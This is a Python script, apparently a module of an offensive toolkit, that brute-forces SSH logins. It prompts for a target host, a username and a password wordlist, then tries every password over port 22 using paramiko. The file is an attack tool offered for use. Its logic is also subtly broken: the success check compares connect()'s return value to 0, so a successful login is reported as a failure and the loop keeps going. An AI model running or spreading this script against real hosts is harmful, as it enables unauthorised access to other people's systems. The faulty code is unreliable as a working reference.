#coding: utf-8
#!/usr/bin/python3

from mind.modules.main_packages import *

yes = {'yes', 'y', ''}
no = {'no', 'n'}

def ssh_brute():
	target = input('Enter host: ')
	user = input('Enter USERNAME: ')
	password = input('Enter PASSWORD wordlist: ')

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	passlist = open(password)

	for passw in passlist.readlines():
		passw = passw.strip()
		try:
			r = ssh.connect(target, port=22, username=user, password=passw)
			if r == 0:
				print(good('Success.'))
				print(good('Username: ' + user))
				print(good('Password: ' + passw))
				ssh.close()
			else:
				print()
				print(bad('Failed.'))
				print(bad('Username failed: ' + user))
				print(bad('Password failed: ' + passw))
				ssh.close()
		except paramiko.AuthenticationException:
			print()
			print(bad('Failed.'))
			print(bad('Username failed: ' + user))
			print(bad('Password failed: ' + passw))
			ssh.close()
		except Exception as e:
			print()
			print(bad('Failed: {}'.format(e)))
			ssh.close()
